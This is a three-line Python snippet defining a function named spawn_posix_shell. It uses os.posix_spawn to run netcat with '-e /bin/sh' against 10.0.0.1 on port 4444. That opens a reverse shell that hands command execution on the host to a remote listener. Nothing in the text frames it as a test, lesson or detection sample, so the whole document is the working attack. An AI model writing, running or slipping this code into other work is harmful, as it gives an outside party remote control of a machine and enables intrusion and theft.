import os
def spawn_posix_shell():
    os.posix_spawn('/bin/sh', ['sh', '-c', 'nc -e /bin/sh 10.0.0.1 4444'], os.environ)
